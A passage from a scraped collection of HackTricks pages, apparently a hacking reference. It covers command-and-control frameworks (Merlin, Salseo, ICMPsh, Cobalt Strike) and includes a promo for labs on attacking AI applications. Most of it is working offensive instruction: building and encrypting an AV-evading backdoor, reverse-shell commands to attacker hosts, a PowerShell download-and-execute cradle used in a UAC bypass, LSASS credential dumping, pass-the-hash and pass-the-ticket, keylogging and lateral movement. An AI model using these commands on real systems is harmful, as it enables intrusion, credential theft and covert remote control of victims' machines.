signature.\nReferences\n‚Äã\nhttps://en.wikipedia.org/wiki/Proof_of_stake\n‚Äã\n‚Äã\nhttps://www.mycryptopedia.com/public-key-private-key-explained/\n‚Äã\n‚Äã\nhttps://bitcoin.stackexchange.com/questions/3718/what-are-multi-signature-transactions\n‚Äã\n‚Äã\nhttps://ethereum.org/en/developers/docs/transactions/\n‚Äã\n‚Äã\nhttps://ethereum.org/en/developers/docs/gas/\n‚Äã\n‚Äã\nhttps://en.bitcoin.it/wiki/Privacy\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nEsoteric languages\nNext\n- External Platforms Reviews/Writeups\nBRA.I.NSMASHER Presentation\nLast modified\n6mo ago"
    },
    {
        "title": "BRA.I.NSMASHER Presentation",
        "url": "https://book.hacktricks.xyz/external-platforms-reviews-writeups/bra.i.nsmasher-presentation",
        "text": "BRA.I.NSMASHER Presentation\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPresentation\nBrainSmasher\nis a platform made with the purpose of aiding\npentesters, researcher, students, A.I. Cybersecurity engineers\nto practice and learn all the techniques for\nexploiting commercial A.I.\napplications, by working on specifically crafted labs that reproduce several systems, like face recognition, speech recognition, ensemble image classification, autonomous drive, malware evasion, chatbot, data poisoning etc...\nEvery month a lab on various topic found in commercial A.I. applications will be posted, with\n3 different difficulties\n(named challenges), in order to\nguide\nthe user in\nunderstanding\nall the mechanics behind it and practice\ndifferent\nways of\nexploitation\n.\nSince A.I. applications are relatively new, there is also the possibility that the\nharder difficulty challenges for the labs don't have some public known ways of exploitation\n, so it's up to you to find the correct solution. Maybe some challenges could need the\ncombination\nof \"\nstandard\n\"\ncybersecurity\ntechniques with\nmachine\nlearning\nadversarial attacks ;)\nThe platform, which is now in\nbeta\nversion, will also feature in the next future\npaid\ncompetitions,\njob\noffers\nposting,\nranking\nsystem,\ntutorials\non several A.I. exploit topics, the possibility to\nearn\nmoney\nby\nproposing\npersonal\nlabs\nor different challenges, for an already existent A.I. lab applications, to be used by the community and also propose modification already existent challenges in order to augment their robustness vs. the various attacks.\nAll the\nmaterial and the techs for the exploitation of A.I. will be posted here\nin a dedicated section of hacktricks.\nWhile\nwe are in\nbeta\nversion and completing the implementation of all the above described features, the subscription and all the already posted labs with their relative\nchallenges are free\n.\nSo start learning how to exploit A.I. for free while you can in\nBrA.I.Smasher Website\nENJOY ;)\nA big thanks to Hacktricks and Carlos Polop for giving us this opportunity\nWalter Miele from BrA.I.nsmasher\nRegistry Challenge\nIn order to register in\nBrA.I.Smasher\nyou need to solve an easy challenge (\nhere\n).\nJust think how you can confuse a neuronal network while not confusing the other one knowing that one detects better the panda while the other one is worse...\nHowever, if at some point you\ndon't know how to solve\nthe challenge, or\neven if you solve it\n, check out the official solution in\ngoogle colab\n.\nI have to tell you that there are\neasier ways\nto pass the challenge, but this\nsolution\nis\nawesome\nas you will learn how to pass the challenge performing an\nAdversarial Image performing a Fast Gradient Signed Method (FGSM) attack for images.\nMore Tutorials\nBasic Captcha Breaker\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nBlockchain & Crypto Currencies\nNext\nBasic Bruteforcer\nLast modified\n6mo ago"
    },
    {
        "title": "Merlin",
        "url": "https://book.hacktricks.xyz/c2/merlin",
        "text": "Merlin\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nInstallation\nInstall GO\n#Download GO package from: https://golang.org/dl/\n#Decompress the packe using:\ntar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz\n‚Äã\n#Change /etc/profile\nAdd \":/usr/local/go/bin\" to PATH\nAdd \"export GOPATH=$HOME/go\"\nAdd \"export GOBIN=$GOPATH/bin\"\n‚Äã\nsource /etc/profile\nInstall Merlin\ngo get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch\ncd $GOPATH/src/github.com/Ne0nd0g/merlin/\nLaunch Merlin Server\ngo run cmd/merlinserver/main.go -i\nMerlin Agents\nYou can\ndownload precompiled agents\n‚Äã\nCompile Agents\nGo to the main folder\n$GOPATH/src/github.com/Ne0nd0g/merlin/\n#User URL param to set the listener URL\nmake #Server and Agents of all\nmake windows #Server and Agents for Windows\nmake windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)\nManual compile agents\nGOOS=windows GOARCH=amd64 go build -ldflags \"-X main.url=https://10.2.0.5:443\" -o agent.exe main.g\nModules\nThe bad news is that every module used by Merlin is downloaded from the source (Github) and saved on disk before using it. Be careful about when using well-known modules because Windows Defender will catch you!\nSafetyKatz\n--> Modified Mimikatz. Dump LSASS to file and launch:sekurlsa::logonpasswords to that file\nSharpDump\n--> minidump for the process ID specified (LSASS by default) (Itsais that the extension of the final file is .gz but indeed it is.bin, but is agz file)\nSharpRoast\n--> Kerberoast (doesn't work)\nSeatBelt\n--> Local Security Tests in CS (does not work) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\nCompiler-CSharp\n--> Compile using csc.exe /unsafe\nSharp-Up\n-->Allchecks in C# in powerup (works)\nInveigh\n--> PowerShellADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool (doesn't works, need to load: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\nInvoke-InternalMonologue\n--> Impersonates all available users and retrieves a challenge-response for each (NTLM hash for each user) (bad url)\nInvoke-PowerThIEf\n--> Steal forms from IExplorer or make it execute JS or inject a DLL in that process (doesnt work) (and the PS looks like doesnt work either) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\nLaZagneForensic\n--> Get browser passwords (works but dont prints the output directory)\ndumpCredStore\n--> Win32 Credential Manager API (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\nGet-InjectedThread\n--> Detect classic injection in running processes (Classic Injection (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (doesnt works)\nGet-OSTokenInformation\n--> Get Token Info of the running processes and threads (User, groups, privileges, owner‚Ä¶ https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-_token_information_class)\nInvoke-DCOM\n--> Execute a command (inother computer) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\nInvoke-DCOMPowerPointPivot\n--> Execute a command in othe PC abusing PowerPoint COM objects (ADDin)\nInvoke-ExcelMacroPivot\n--> Execute a command in othe PC abusing DCOM in Excel\nFind-ComputersWithRemoteAccessPolicies\n--> (not working) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\nGrouper\n--> It dumps all the most interesting parts of group policy and then roots around in them for exploitable stuff. (deprecated) Take a look at Grouper2, looks really nice\nInvoke-WMILM\n--> WMI to move laterally\nGet-GPPPassword\n--> Look for groups.xml, scheduledtasks.xml, services.xmland datasources.xml and returns plaintext passwords (insidedomain)\nInvoke-Mimikatz\n--> Use mimikatz (default dump creds)\nPowerUp\n--> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\nFind-BadPrivilege\n--> Check the privileges of users in computers\nFind-PotentiallyCrackableAccounts\n--> Retrieve information about user accounts associated with SPN (Kerberoasting)\npsgetsystem\n--> getsystem\nDidn't check persistence modules\nResume\nI really like the feeling and the potential of the tool.\nI hope the tool will start downloading the modules from the server and integrates some kind of evasion when downloading scripts.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nFeature Engineering\nNext\n- C2\nEmpire\nLast modified\n6mo ago"
    },
    {
        "title": "Empire",
        "url": "https://book.hacktricks.xyz/c2/empire",
        "text": "Empire\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nC2 -\nPrevious\nMerlin\nNext\n- C2\nSalseo\nLast modified\n6mo ago"
    },
    {
        "title": "Salseo",
        "url": "https://book.hacktricks.xyz/c2/salseo",
        "text": "Salseo\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCompiling the binaries\nDownload the source code from the github and compile\nEvilSalsa\nand\nSalseoLoader\n. You will need\nVisual Studio\ninstalled to compile the code.\nCompile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).\nYou can\nselect the architecture\ninside Visual Studio in the\nleft \"Build\" Tab\nin\n\"Platform Target\".\n(**If you can't find this options press in\n\"Project Tab\"\nand then in\n\"<Project Name> Properties\"\n)\nThen, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):\nPrepare the Backdoor\nFirst of all, you will need to encode the\nEvilSalsa.dll.\nTo do so, you can use the python script\nencrypterassembly.py\nor you can compile the project\nEncrypterAssembly\n:\nPython\npython EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>\npython EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt\nWindows\nEncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>\nEncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt\nOk, now you have everything you need to execute all the Salseo thing: the\nencoded EvilDalsa.dll\nand the\nbinary of SalseoLoader.\nUpload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...\nExecute the backdoor\nGetting a TCP reverse shell (downloading encoded dll through HTTP)\nRemember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.\nSalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>\nGetting a UDP reverse shell (downloading encoded dll through SMB)\nRemember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).\nSalseoLoader.exe password \\\\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>\nGetting a ICMP reverse shell (encoded dll already inside the victim)\nThis time you need a special tool in the client to receive the reverse shell. Download:\nhttps://github.com/inquisb/icmpsh\n‚Äã\nDisable ICMP Replies:\nsysctl -w net.ipv4.icmp_echo_ignore_all=1\n‚Äã\n#You finish, you can enable it again running:\nsysctl -w net.ipv4.icmp_echo_ignore_all=0\nExecute the client:\npython icmpsh_m.py \"<Attacker-IP>\" \"<Victm-IP>\"\nInside the victim, lets execute the salseo thing:\nSalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>\nCompiling SalseoLoader as DLL exporting main function\nOpen the SalseoLoader project using Visual Studio.\nAdd before the main function: [DllExport]\nInstall DllExport for this project\nTools\n-->\nNuGet Package Manager\n-->\nManage NuGet Packages for Solution...\nSearch for DllExport package (using Browse tab), and press Install (and accept the popup)\nIn your project folder have appeared the files:\nDllExport.bat\nand\nDllExport_Configure.bat\nU\nninstall DllExport\nPress\nUninstall\n(yeah, its weird but trust me, it is necessary)\nExit Visual Studio and execute DllExport_configure\nJust\nexit\nVisual Studio\nThen, go to your\nSalseoLoader folder\nand\nexecute DllExport_Configure.bat\nSelect\nx64\n(if you are going to use it inside a x64 box, that was my case), select\nSystem.Runtime.InteropServices\n(inside\nNamespace for DllExport\n) and press\nApply\nOpen the project again with visual Studio\n[DllExport]\nshould not be longer marked as error\nBuild the solution\nSelect\nOutput Type = Class Library\n(Project --> SalseoLoader Properties --> Application --> Output type = Class Library)\nSelect\nx64\nplatform\n(Project --> SalseoLoader Properties --> Build --> Platform target = x64)\nTo\nbuild\nthe solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)\nTest the generated Dll\nCopy and paste the Dll where you want to test it.\nExecute:\nrundll32.exe SalseoLoader.dll,main\nIf no error appears, probably you have a functional DLL!!\nGet a shell using the DLL\nDon't forget to use a\nHTTP\nserver\nand set a\nnc\nlistener\nPowershell\n$env:pass=\"password\"\n$env:payload=\"http://10.2.0.5/evilsalsax64.dll.txt\"\n$env:lhost=\"10.2.0.5\"\n$env:lport=\"1337\"\n$env:shell=\"reversetcp\"\nrundll32.exe SalseoLoader.dll,main\nCMD\nset pass=password\nset payload=http://10.2.0.5/evilsalsax64.dll.txt\nset lhost=10.2.0.5\nset lport=1337\nset shell=reversetcp\nrundll32.exe SalseoLoader.dll,main\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nC2 -\nPrevious\nEmpire\nNext\n- C2\nICMPsh\nLast modified\n6mo ago"
    },
    {
        "title": "ICMPsh",
        "url": "https://book.hacktricks.xyz/c2/icmpsh",
        "text": "ICMPsh\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nDownload the backdoor from:\nhttps://github.com/inquisb/icmpsh\n‚Äã\nClient side\nExecute the script:\nrun.sh\nIf you get some error, try to change the lines:\nIPINT\n=\n$(\nifconfig\n|\ngrep\n\"eth\"\n|\ncut\n-d\n\" \"\n-f\n1\n|\nhead\n-1\n)\nIP\n=\n$(\nifconfig\n\"\n$IPINT\n\"\n|\ngrep\n\"inet addr:\"\n|\ncut\n-d\n\":\"\n-f\n2\n|\nawk\n'{ print $1 }'\n)\nFor:\necho\nPlease insert the IP where you want to listen\nread\nIP\nVictim Side\nUpload\nicmpsh.exe\nto the victim and execute:\nicmpsh.exe\n-t\n<\nAttacker-IP\n>\n-d\n500\n-b\n30\n-s\n128\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nC2 -\nPrevious\nSalseo\nNext\n- C2\nCobalt Strike\nLast modified\n6mo ago"
    },
    {
        "title": "Cobalt Strike",
        "url": "https://book.hacktricks.xyz/c2/cobalt-strike",
        "text": "Cobalt Strike\nListeners\nC2 Listeners\nCobalt Strike -> Listeners -> Add/Edit\nthen you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.\nPeer2Peer Listeners\nThe beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.\nCobalt Strike -> Listeners -> Add/Edit\nthen you need to select the TCP or SMB beacons\nThe\nTCP beacon will set a listener in the port selected\n. To connect to a TCP beacon use the command\nconnect <ip> <port>\nfrom another beacon\nThe\nsmb beacon will listen in a pipename with the selected name\n. To connect to a SMB beacon you need to use the command\nlink [target] [pipe]\n.\nGenerate & Host payloads\nGenerate payloads in files\nAttacks -> Packages ->\nHTMLApplication\nfor HTA files\nMS Office Macro\nfor an office document with a macro\nWindows Executable\nfor a .exe, .dll orr service .exe\nWindows Executable (S)\nfor a\nstageless\n.exe, .dll or service .exe (better stageless than staged, less IoCs)\nGenerate & Host payloads\nAttacks -> Web Drive-by -> Scripted Web Delivery (S)\nThis will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python\nHost Payloads\nIf you already has the file you want to host in a web sever just go to\nAttacks -> Web Drive-by -> Host File\nand select the file to host and web server config.\nBeacon Options\n# Execute local .NET binary\nexecute-assembly\n<\n/path/to/executable.exe\n>\n‚Äã\n# Screenshots\nprintscreen\n# Take a single screenshot via PrintScr method\nscreenshot\n# Take a single screenshot\nscreenwatch\n#¬†Take periodic screenshots of desktop\n## Go to View -> Screenshots to see them\n‚Äã\n# keylogger\nkeylogger\n[\npid\n]\n[\nx86\n|\nx64\n]\n## View > Keystrokes to see the keys pressed\n‚Äã\n# portscan\nportscan\n[\npid\n]\n[\narch\n]\n[\ntargets\n]\n[\nports\n]\n[\narp\n|\nicmp\n|\nnone\n]\n[\nmax connections\n]\n# Inject portscan action inside another process\nportscan\n[\ntargets\n]\n[\nports\n]\n[\narp\n|\nicmp\n|\nnone\n]\n[\nmax connections\n]\n‚Äã\n# Powershell\n# Import Powershell module\npowershell-import C:\n\\\npath\n\\\nto\n\\\nPowerView.ps1\npowershell\n<\njust\nwrite\npowershell cmd here\n>\n‚Äã\n# User impersonation\n## Token generation with creds\nmake_token\n[\nDOMAIN\n\\\nuser\n]\n[\npassword\n]\n#Create token to impersonate a user in the network\nls\n\\\\\ncomputer_name\n\\\nc$\n# Try to use generated token to access C$ in a computer\nrev2self\n# Stop using token generated with make_token\n## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.\n‚Äã\n# UAC Bypass\nelevate svc-exe\n<\nlistener\n>\nelevate uac-token-duplication\n<\nlistener\n>\nrunasadmin uac-cmstplua powershell.exe\n-nop\n-w\nhidden\n-c\n\"IEX\n((\nnew\n-\nobject net.webclient\n)\n.downloadstring\n(\n'http\n://\n10.10.5.120\n:\n80\n/\nb'\n))\n\"\n‚Äã\n## Steal token from pid\n## Like make_token but stealing the token from a process\nsteal_token\n[\npid\n]\n# Also, this is useful for network actions, not local actions\n## From the API documentation we know that this logon type \"allows the caller to clone its current token\". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.\nls\n\\\\\ncomputer_name\n\\\nc$\n# Try to use generated token to access C$ in a computer\nrev2self\n# Stop using token from steal_token\n‚Äã\n##¬†Launch process with nwe credentials\nspawnas\n[\ndomain\n\\\nusername\n]\n[\npassword\n]\n[\nlistener\n]\n#Do it from a directory with read access like: cd C:\\\n## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).\n‚Äã\n## Inject into process\ninject\n[\npid\n]\n[\nx64\n|\nx86\n]\n[\nlistener\n]\n## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).\n‚Äã\n## Pass the hash\n## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.\npth\n[\npid\n]\n[\narch\n]\n[\nDOMAIN\n\\\nuser\n]\n[\nNTLM hash\n]\npth\n[\nDOMAIN\n\\\nuser\n]\n[\nNTLM hash\n]\n‚Äã\n## Pass the hash through mimikatz\nmimikatz sekurlsa::pth /user:\n<\nusername\n>\n/domain:\n<\nDOMAIN\n>\n/ntlm:\n<\nNTLM HASH\n>\n/run:\n\"powershell -w hidden\"\n## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)\nsteal_token\n<\npid\n>\n#Steal token from process created by mimikatz\n‚Äã\n## Pass the ticket\n## Request a ticket\nexecute-assembly C:\n\\\npath\n\\\nRubeus.exe asktgt /user:\n<\nusername\n>\n/domain:\n<\ndomain\n>\n/aes256:\n<\naes_keys\n>\n/nowrap /opsec\n## Create a new logon session to use with the new ticket (to not overwrite the compromised one)\nmake_token\n<\ndomain\n>\n\\\n<\nusername\n>\nDummyPass\n## Write the ticket in the attacker machine from a poweshell session & load it\n[\nSystem.IO.File\n]\n::WriteAllBytes\n(\n\"C:\\Users\\Administrator\\Desktop\\jkingTGT.kirbi\"\n,\n[\nSystem.Convert\n]\n::FromBase64String\n(\n\"[...ticket...]\"\n))\nkerberos_ticket_use C:\n\\\nUsers\n\\\nAdministrator\n\\\nDesktop\n\\\njkingTGT.kirbi\n‚Äã\n## Pass the ticket from SYSTEM\n## Generate a new process with the ticket\nexecute-assembly C:\n\\\npath\n\\\nRubeus.exe asktgt /user:\n<\nUSERNAME\n>\n/domain:\n<\nDOMAIN\n>\n/aes256:\n<\nAES KEY\n>\n/nowrap /opsec /createnetonly:C:\n\\\nWindows\n\\\nSystem32\n\\\ncmd.exe\n## Steal the token from that process\nsteal_token\n<\npid\n>\n‚Äã\n## Extract ticket + Pass the ticket\n### List tickets\nexecute-assembly C:\n\\\npath\n\\\nRubeus.exe triage\n### Dump insteresting ticket by luid\nexecute-assembly C:\n\\\npath\n\\\nRubeus.exe dump /service:krbtgt /luid:\n<\nluid\n>\n/nowrap\n### Create new logon session, note luid and processid\nexecute-assembly C:\n\\\npath\n\\\nRubeus.exe createnetonly /program:C:\n\\\nWindows\n\\\nSystem32\n\\\ncmd.exe\n### Insert ticket in generate logon session\nexecute-assembly C:\n\\\npath\n\\\nRubeus.exe ptt /luid:0x92a8c /ticket:\n[..\n.base64-ticket\n..\n.\n]\n### Finally, steal the token from that new process\nsteal_token\n<\npid\n>\n‚Äã\n#¬†Lateral Movement\n## If a token was created it will be used\njump\n[\nmethod\n]\n[\ntarget\n]\n[\nlistener\n]\n## Methods:\n## psexec                    x86   Use a service to run a Service EXE artifact\n## psexec64                  x64   Use a service to run a Service EXE artifact\n##¬†psexec_psh                x86   Use a service to run a PowerShell one-liner\n##¬†winrm                     x86   Run a PowerShell script via WinRM\n##¬†winrm64                   x64   Run a PowerShell script via WinRM\n‚Äã\nremote-exec\n[\nmethod\n]\n[\ntarget\n]\n[\ncommand\n]\n## Methods:\n##¬†psexec                          Remote execute via Service Control Manager\n##¬†winrm                           Remote execute via WinRM (PowerShell)\n##¬†wmi                             Remote execute via WMI\n‚Äã\n## To execute a beacon with wmi (it isn't ins the jump command) just upload the beacon and execute it\nbeacon\n>\nupload C:\n\\\nPayloads\n\\\nbeacon-smb.exe\nbeacon\n>\nremote-exec wmi srv-1 C:\n\\\nWindows\n\\\nbeacon-smb.exe\n‚Äã\n‚Äã\n# Pass session to Metasploit - Through listener\n## On metaploit host\nmsf6\n>\nuse exploit/multi/handler\nmsf6 exploit\n(\nmulti/handler\n)\n>\nset\npayload windows/meterpreter/reverse_http\nmsf6 exploit\n(\nmulti/handler\n)\n>\nset\nLHOST eth0\nmsf6 exploit\n(\nmulti/handler\n)\n>\nset\nLPORT\n8080\nmsf6 exploit\n(\nmulti/handler\n)\n>\nexploit\n-j\n‚Äã\n## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.\nbeacon\n>\nspawn metasploit\n## You can only spawn x86 